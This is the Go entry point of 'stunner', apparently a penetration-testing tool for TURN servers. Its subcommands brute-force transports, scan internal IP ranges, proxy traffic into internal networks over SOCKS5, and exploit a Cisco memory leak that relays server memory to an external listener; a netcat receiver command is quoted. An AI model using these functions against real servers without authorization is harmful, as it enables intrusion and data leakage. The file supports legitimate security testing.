// https://hackerone.com/reports/333419
// https://www.immunit.ch/en/blog/2018/06/12/vulnerability-disclosure-cisco-meeting-server-arbitrary-tcp-relaying-2/
// https://github.com/wireshark/wireshark/blob/245086eb8382bca3c134a4fd7507c185246127e2/epan/dissectors/packet-stun.c
// https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise/

// STUN: https://datatracker.ietf.org/doc/html/rfc5389
// TURN: https://datatracker.ietf.org/doc/html/rfc5766
// TURN for TCP: https://datatracker.ietf.org/doc/html/rfc6062
// TURN Extension for IPv6: https://datatracker.ietf.org/doc/html/rfc6156

// https://blog.addpipe.com/troubleshooting-webrtc-connection-issues/

package main

import (
	"fmt"
	"math/rand"
	"net"
	"net/netip"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/firefart/stunner/internal/cmd"
	"github.com/sirupsen/logrus"

	"github.com/urfave/cli/v2"
)

func main() {
	log := logrus.New()
	log.SetOutput(os.Stdout)
	log.SetLevel(logrus.InfoLevel)

	rand.Seed(time.Now().UnixNano())

	app := &cli.App{
		Name:  "stunner",
		Usage: "test turn servers for misconfigurations",
		Authors: []*cli.Author{
			{
				Name:  "Christian Mehlmauer",
				Email: "firefart@gmail.com",
			},
		},
		Copyright: "This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-sa/4.0/ or send a letter to Creative Commons, PO Box 1866, Mountain View, CA 94042, USA.",
		Commands: []*cli.Command{
			{
				Name:        "info",
				Usage:       "Prints out some info about the server",
				Description: "This command tries to establish a connection and prints out some gathered information",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					return cmd.Info(cmd.InfoOpts{
						TurnServer: turnServer,
						UseTLS:     useTLS,
						Protocol:   protocol,
						Log:        log,
						Timeout:    timeout,
					})
				},
			},
			{
				Name:  "brute-transports",
				Usage: "This command bruteforces all available transports",
				Description: "This command bruteforces all available transports on the STUN protocol." +
					"This can be used to identify interesting non default transports. Transports" +
					"are basically protocols that the STUN/TURN server can speak to the internal" +
					"systems. This normally only yields tcp and udp.",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
					&cli.StringFlag{Name: "username", Aliases: []string{"u"}, Required: true, Usage: "username for the turn server"},
					&cli.StringFlag{Name: "password", Aliases: []string{"p"}, Required: true, Usage: "password for the turn server"},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					username := c.String("username")
					password := c.String("password")
					return cmd.BruteTransports(cmd.BruteTransportOpts{
						TurnServer: turnServer,
						UseTLS:     useTLS,
						Protocol:   protocol,
						Log:        log,
						Timeout:    timeout,
						Username:   username,
						Password:   password,
					})
				},
			},
			{
				Name:  "memoryleak",
				Usage: "This command exploits a memory information leak in some cisco software",
				Description: "This command exploits a memory leak in a cisco software product." +
					"We use a misconfigured server that also relays UDP connections to external hosts to" +
					"receive the data. We send a TLV with an arbitrary length that is not checked server side" +
					"and so the server returns a bunch of memory to the external server where the traffic is" +
					"relayed to." +
					"To receive the data you need to run a listener on the external server to receive the data:" +
					"sudo nc -u -l -n -v -p 8080 | hexdump -C",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
					&cli.StringFlag{Name: "username", Aliases: []string{"u"}, Required: true, Usage: "username for the turn server"},
					&cli.StringFlag{Name: "password", Aliases: []string{"p"}, Required: true, Usage: "password for the turn server"},
					&cli.StringFlag{Name: "target", Aliases: []string{"t"}, Required: true, Usage: "Target to leak memory to in the form host:port. Should be a public server under your control"},
					&cli.UintFlag{Name: "size", Value: 35510, Usage: "Size of the buffer to leak"},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					username := c.String("username")
					password := c.String("password")

					targetString := c.String("target")
					if targetString == "" || !strings.Contains(targetString, ":") {
						return fmt.Errorf("please supply a valid target")
					}
					targetHost, port, err := net.SplitHostPort(targetString)
					if err != nil {
						return fmt.Errorf("please supply a valid target: %w", err)
					}
					targetIP, err := netip.ParseAddr(targetHost)
					if err != nil {
						return fmt.Errorf("target is no valid ip address: %w", err)
					}
					targetPort, err := strconv.ParseUint(port, 10, 16)
					if err != nil {
						return fmt.Errorf("error on parsing port: %w", err)
					}

					size := c.Uint("size")
					return cmd.MemoryLeak(cmd.MemoryleakOpts{
						TurnServer: turnServer,
						UseTLS:     useTLS,
						Protocol:   protocol,
						Log:        log,
						Timeout:    timeout,
						Username:   username,
						Password:   password,
						TargetHost: targetIP,
						TargetPort: uint16(targetPort),
						Size:       uint16(size),
					})
				},
			},
			{
				Name:  "range-scan",
				Usage: "Scan if the TURN server allows connections to restricted network ranges",
				Description: "This command tries to establish a connection via the TURN protocol to predefined" +
					"network ranges. If these result in a success, the TURN implementation" +
					"might not filter private and restricted ranges correctly.",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
					&cli.StringFlag{Name: "username", Aliases: []string{"u"}, Required: true, Usage: "username for the turn server"},
					&cli.StringFlag{Name: "password", Aliases: []string{"p"}, Required: true, Usage: "password for the turn server"},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					username := c.String("username")
					password := c.String("password")
					return cmd.RangeScan(cmd.RangeScanOpts{
						TurnServer: turnServer,
						UseTLS:     useTLS,
						Protocol:   protocol,
						Log:        log,
						Timeout:    timeout,
						Username:   username,
						Password:   password,
					})
				},
			},
			{
				Name:  "socks",
				Usage: "This starts a socks5 server and relays TCP traffic via the TURN over TCP protocol",
				Description: "This starts a local socks5 server and relays only TCP traffic via the TURN over TCP protocol." +
					"This way you can access internal systems via TCP on the TURN servers network if it is misconfigured.",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
					&cli.StringFlag{Name: "username", Aliases: []string{"u"}, Required: true, Usage: "username for the turn server"},
					&cli.StringFlag{Name: "password", Aliases: []string{"p"}, Required: true, Usage: "password for the turn server"},
					&cli.StringFlag{Name: "listen", Aliases: []string{"l"}, Value: "127.0.0.1:1080", Usage: "Address and port to listen on"},
					&cli.BoolFlag{Name: "drop-public", Aliases: []string{"x"}, Value: true, Usage: "Drop requests to public IPs. This is handy if the target can not connect to the internet and your browser want's to check TLS certificates via the connection."},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					username := c.String("username")
					password := c.String("password")
					listen := c.String("listen")
					dropPublic := c.Bool("drop-public")
					return cmd.Socks(cmd.SocksOpts{
						TurnServer: turnServer,
						UseTLS:     useTLS,
						Protocol:   protocol,
						Log:        log,
						Timeout:    timeout,
						Username:   username,
						Password:   password,
						Listen:     listen,
						DropPublic: dropPublic,
					})
				},
			},
			{
				Name:        "tcp-scanner",
				Usage:       "Scans private IP ranges for snmp and dns ports",
				Description: "This command scans internal IPv4 ranges for http servers with the given ports.",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
					&cli.StringFlag{Name: "username", Aliases: []string{"u"}, Required: true, Usage: "username for the turn server"},
					&cli.StringFlag{Name: "password", Aliases: []string{"p"}, Required: true, Usage: "password for the turn server"},
					&cli.StringFlag{Name: "ports", Value: "80,443,8080,8081", Usage: "Ports to check"},
					&cli.StringSliceFlag{Name: "ip", Usage: "Scan single IP instead of whole private range. If left empty all private ranges are scanned. Accepts single IPs or CIDR format."},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					username := c.String("username")
					password := c.String("password")

					portsRaw := c.String("ports")
					ports := strings.Split(portsRaw, ",")

					ips := c.StringSlice("ip")

					return cmd.TCPScanner(cmd.TCPScannerOpts{
						TurnServer: turnServer,
						UseTLS:     useTLS,
						Protocol:   protocol,
						Log:        log,
						Timeout:    timeout,
						Username:   username,
						Password:   password,
						Ports:      ports,
						IPs:        ips,
					})
				},
			},
			{
				Name:  "udp-scanner",
				Usage: "Scans private IP ranges for snmp and dns",
				Description: "This command scans internal IPv4 ranges for open SNMP ports with the given" +
					"community string and for open DNS ports.",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "turnserver", Aliases: []string{"s"}, Required: true, Usage: "turn server to connect to in the format host:port"},
					&cli.BoolFlag{Name: "tls", Value: false, Usage: "Use TLS for connecting (false in most tests)"},
					&cli.StringFlag{Name: "protocol", Value: "udp", Usage: "protocol to use when connecting to the TURN server. Supported values: tcp and udp"},
					&cli.DurationFlag{Name: "timeout", Value: 1 * time.Second, Usage: "connect timeout to turn server"},
					&cli.StringFlag{Name: "username", Aliases: []string{"u"}, Required: true, Usage: "username for the turn server"},
					&cli.StringFlag{Name: "password", Aliases: []string{"p"}, Required: true, Usage: "password for the turn server"},
					&cli.StringFlag{Name: "community-string", Value: "public", Usage: "SNMP community string to use for scanning"},
					&cli.StringFlag{Name: "domain", Required: true, Usage: "domain name to resolve on internal DNS servers during scanning"},
					&cli.StringSliceFlag{Name: "ip", Usage: "Scan single IP instead of whole private range. If left empty all private ranges are scanned. Accepts single IPs or CIDR format."},
				},
				Before: func(ctx *cli.Context) error {
					if ctx.Bool("debug") {
						log.SetLevel(logrus.DebugLevel)
					}
					return nil
				},
				Action: func(c *cli.Context) error {
					turnServer := c.String("turnserver")
					useTLS := c.Bool("tls")
					protocol := c.String("protocol")
					timeout := c.Duration("timeout")
					username := c.String("username")
					password := c.String("password")
					communityString := c.String("community-string")
					domain := c.String("domain")
					ips := c.StringSlice("ip")
					return cmd.UDPScanner(cmd.UDPScannerOpts{
						TurnServer:      turnServer,
						UseTLS:          useTLS,
						Protocol:        protocol,
						Log:             log,
						Timeout:         timeout,
						Username:        username,
						Password:        password,
						CommunityString: communityString,
						DomainName:      domain,
						IPs:             ips,
					})
				},
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
